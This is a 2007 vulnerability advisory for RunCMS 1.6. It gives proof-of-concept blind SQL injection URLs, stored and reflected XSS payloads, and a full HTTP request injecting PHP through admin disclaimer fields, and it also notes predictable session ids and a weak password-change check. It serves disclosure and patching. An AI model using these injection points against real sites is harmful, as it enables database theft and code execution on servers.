@@ -1,0 +1,176 @@
+Digital Security Research Group Advisory
+
+
+Application:                    RunCMS
+Versions Affected:              RunCMS 1.6
+Vendor URL:                     http://www.runcms.org
+Bugs:                           SQL Injections, XSS, PHP Include, Predictable session id, etc.
+Exploits:                       Aviable
+Reported:                       14.12.2007
+Vendor response:                15.12.2007
+Date of Public Advisory:        25.12.2007
+Authors:                        Alexandr Polyakov, Stas Svistunovich
+                                Digital Security Research Group (research@dsec.ru)
+OSVDB:                          41231, 41241, 41242, 41243, 42145, 41246, 41248, 41249, 41250, 41251
+
+
+Description
+***********
+
+RunCMS system has multiple security vulnerabilities:
+
+1. Blind SQL Injection
+2. Stored XSS
+3. Linked XSS
+4. Image XSS
+5. Predictable session id
+6. Vulnerable password changing algorithm
+7. Many PHP Injections in Administrator panel
+
+
+Details
+*******
+
+
+1. Multiple Blind SQL Injection
+
+Attacker can inject SQL code in modules:
+
+        http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid+DSecRG_INJECTION
+        http://[server]/[installdir]/modules/mydownloads/visit.php?lid=2+DSecRG_INJECTION
+        http://[server]/[installdir]/modules/mydownloads/ratefile.php?lid=2+DSecRG_INJECTION
+        http://[server]/[installdir]/modules/mylinks/ratelink.php?lid=2+DSecRG_INJECTION
+        http://[server]/[installdir]/modules/mylinks/modlink.php?lid=2+DSecRG_INJECTION
+        http://[server]/[installdir]/modules/mylinks/brokenlink.php?lid=2+DSecRG_INJECTION
+
+Example:
+
+This query will return link to download file:
+        GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=1 HTTP/1.0
+
+
+This query will return error:
+        GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=0 HTTP/1.0
+
+--------------------------------------------------------------------------------------------
+
+
+2. Stored XSS
+
+Vulnerability found in script modules/news/submit.php in post parameter name "subject"
+
+
+Example:
+
+        POST http://[server]/[installdir]/modules/news/submit.php HTTP/1.0
+
+
+        subject=<script>alert("DSecRG_XSS")</script>
+
+--------------------------------------------------------------------------------------------
+
+
+3. Linked XSS vulnerability found in modules/news/index.php, attacker can inject XSS in URL string:
+
+Example:
+
+        http://[server]/[installdir]/modules/news/index.php/"><script>alert('DSecRG_XSS')</script>
+
+--------------------------------------------------------------------------------------------
+
+
+4. Image XSS vulnerability in page edituser.php, attacker can upload avatar picture with XSS code:
+
+
+Example:
+
+        More info: http://www.dsec.ru/about/articles/web_xss/ (in Russian)
+
+--------------------------------------------------------------------------------------------
+
+
+5. Predictable session id
+
+Session id generator uses a predictable function, so id can be changed manually.
+
+--------------------------------------------------------------------------------------------
+
+6. Password changing vulnerability
+
+Previous password not required to set a new password.
+
+--------------------------------------------------------------------------------------------
+
+
+7. Administrator page PHP Injection
+
+Administrator can inject PHP code and execute OS commands with webserver user privileges.
+
+page: /modules/system/admin.php?fct=meta-generator
+        parameter name="header"
+        parameter name="footer"
+
+page: /modules/system/admin.php?fct=disclaimer
+        parameter name="disclaimer"
+
+page: /modules/mydownloads/admin/index.php?op=mydownloadsConfigAdmin
+        parameter name='disclaimer'
+
+page: /modules/newbb_plus/admin/forum_config.php
+        parameter name="disclaimer"
+
+page: /modules/mylinks/admin/index.php?op=myLinksConfigAdmin
+        parameter name="disclaimer"
+
+page: /modules/sections/admin/index.php?op=secconfig
+        parameter name='intro'
+
+
+Example:
+
+        POST /modules/system/admin.php?fct=disclaimer HTTP/1.0
+        Host=localhost
+        User-Agent=Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7
+        Keep-Alive=300
+        Proxy-Connection=keep-alive
+        Content-Type=application/x-www-form-urlencoded
+        Content-Length=226
+        POSTDATA=perpage=10&popular=100&newlinks=10&useshots=0&shotwidth=140&anon_add=0&rss_enable=1&rss_maxitems=5&rss_maxdescription=200&
+        disclaimer=<?phpinfo();?>&op=myLinksConfigChange
+
+
+This page can be overwritten by PHP injection:
+
+        runcms_1.6\modules\sections\cache\intro.php
+        runcms_1.6\modules\mylinks\cache\disclaimer.php
+        runcms_1.6\modules\mydownloads\cache\disclaimer.php
+        runcms_1.6\modules\newbb_plus\cache\disclaimer.php
+        runcms_1.6\modules\system\cache\disclaimer.php
+        runcms_1.6\modules\system\cache\footer.php
+        runcms_1.6\modules\system\cache\header.php
+        runcms_1.6\modules\system\cache\maintenance.php
+
+
+
+Fix Information
+***************
+
+RunCMS was altered to fix this flaw on Dec 15, 2007. Updated version (1.6.1) can be downloaded here:
+        http://www.runcms.org/modules/mydownloads/visit.php?lid=131
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting,
+audit and penetration testing services, risk analysis and ISMS-related services and certification for
+ISO/IEC 27001:2005 and PCI DSS standards.
+Digital Security Research Group focuses on web application and database security problems
+with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research@dsec.ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2007-12-25]
